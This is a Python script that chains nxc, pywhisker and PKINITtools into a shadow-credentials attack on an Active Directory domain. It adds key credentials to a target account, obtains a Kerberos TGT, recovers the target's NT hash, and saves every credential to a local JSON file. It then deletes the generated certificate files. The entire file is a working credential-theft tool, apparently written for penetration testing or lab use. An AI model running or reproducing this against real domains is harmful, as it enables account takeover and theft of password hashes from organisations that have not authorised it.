import argparse
import subprocess
import re
import os
import json
import glob

# Run a command and return stdout + stderr
def run_cmd(cmd):
    print(f"Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout)
    print(result.stderr)
    return result.stdout + result.stderr

# Extract PFX file and password from pywhisker output
def parse_pywhisker_output(output):
    pfx_file = None
    pfx_pass = None
    file_match = re.search(r"Saved PFX.*?: (.*?\.pfx)", output)
    pass_match = re.search(r"Must be used with password: (.*?)\n", output)

    if file_match:
        pfx_file = file_match.group(1).strip()
    if pass_match:
        pfx_pass = pass_match.group(1).strip()

    return pfx_file, pfx_pass

# Extract AS-REP key from gettgtpkinit output
def parse_asrep_key(output):
    lines = output.splitlines()
    for i, line in enumerate(lines):
        if "AS-REP encryption key" in line:
            match = re.search(r'[a-f0-9]{64}', line)
            if match:
                return match.group(0)
            if i + 1 < len(lines):
                match = re.search(r'[a-f0-9]{64}', lines[i + 1])
                if match:
                    return match.group(0)
    return None

# Extract NT hash from getnthash.py output
def parse_nthash(output):
    match = re.search(r'Recovered NT Hash\s*([a-f0-9]{32})', output)
    if match:
        return match.group(1)
    return None

def main():
    parser = argparse.ArgumentParser(description="Automation nxc + pywhisker + PKINITtools")
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("-t", "--target", required=True, help="Final user")
    parser.add_argument("--dc", required=True, help="Domain Controller IP")
    parser.add_argument("--exp", help="Optional account for KRB5CCNAME after TGT creation")
    args = parser.parse_args()

    # Folder for storing credentials
    creds_dir = "creds"
    if not os.path.exists(creds_dir):
        os.makedirs(creds_dir)

    # Step 0: run nxc smb to generate hosts file
    hosts_file = "host_script"
    nxc_cmd = f"nxc smb {args.dc} --generate-hosts-file {hosts_file}"
    run_cmd(nxc_cmd)
    print(f"[+] Hosts file generated: {hosts_file}")

    # Save initial credentials immediately after hosts_file generation
    cred_file = os.path.join(creds_dir, f"{args.target}_initial.json")
    data = {
        "username": args.user,
        "password": args.password,
        "domain": args.domain,
        "dc": args.dc,
        "target": args.target,
        "hosts_file": hosts_file
    }
    with open(cred_file, "w") as f:
        json.dump(data, f, indent=4)
    print(f"[+] Initial credentials saved in {cred_file}")

    # Step 1: run pywhisker
    pywhisker_cmd = f'python3 pywhisker.py -d "{args.domain}" -u "{args.user}" -p "{args.password}" --target "{args.target}" --action "add"'
    pywhisker_output = run_cmd(pywhisker_cmd)

    # Extract PFX file and password
    pfx_file, pfx_pass = parse_pywhisker_output(pywhisker_output)
    if not pfx_file or not pfx_pass:
        print("[-] Could not extract PFX or password from pywhisker output!")
        return
    print(f"[+] Found PFX: {pfx_file}")
    print(f"[+] Found password: {pfx_pass}")

    # Save PFX info in creds
    data.update({"pfx_file": pfx_file, "pfx_pass": pfx_pass})
    with open(cred_file, "w") as f:
        json.dump(data, f, indent=4)

    # Build faketime
    faketime_cmd = f'$(ntpdate -q {args.dc} | cut -d " " -f 1,2)'

    # Step 2: run gettgtpkinit and obtain TGT
    gettgt_cmd = f'faketime "{faketime_cmd}" python3 PKINITtools/gettgtpkinit.py -cert-pfx {pfx_file} {args.domain}/{args.target} -pfx-pass "{pfx_pass}" {args.target}.ccache'
    gettgt_output = run_cmd(gettgt_cmd)

    # Extract AS-REP key
    asrep_key = parse_asrep_key(gettgt_output)
    if not asrep_key:
        print("[-] Could not extract AS-REP key!")
        return
    print(f"[+] Found AS-REP key: {asrep_key}")

    # Save AS-REP key
    data.update({"asrep_key": asrep_key, "krb5ccname": f"{args.target}.ccache"})
    with open(cred_file, "w") as f:
        json.dump(data, f, indent=4)

    # Set KRB5CCNAME if --exp is provided
    if args.exp:
        os.environ["KRB5CCNAME"] = args.exp
        print(f"[+] Set KRB5CCNAME to {os.environ['KRB5CCNAME']}")

    # Step 3: run getnthash.py using AS-REP key and target
    getnthash_cmd = f'faketime "{faketime_cmd}" python3 PKINITtools/getnthash.py -key {asrep_key} {args.domain}/{args.target}'
    nthash_output = run_cmd(getnthash_cmd)

    # Extract NT hash
    nt_hash = parse_nthash(nthash_output)
    if not nt_hash:
        print("[-] Could not extract NT hash!")
        return
    print(f"[+] Found NT hash: {nt_hash}")

    # Save NT hash in creds
    data.update({"nt_hash": nt_hash})
    with open(cred_file, "w") as f:
        json.dump(data, f, indent=4)

    # Step 4: Cleanup - remove temporary files
    for ext in ["*.bak", "*.pem", "*.pfx"]:
        for file in glob.glob(ext):
            try:
                os.remove(file)
                print(f"[+] Removed: {file}")
            except Exception as e:
                print(f"[-] Could not remove {file}: {e}")

if __name__ == "__main__":
    main()
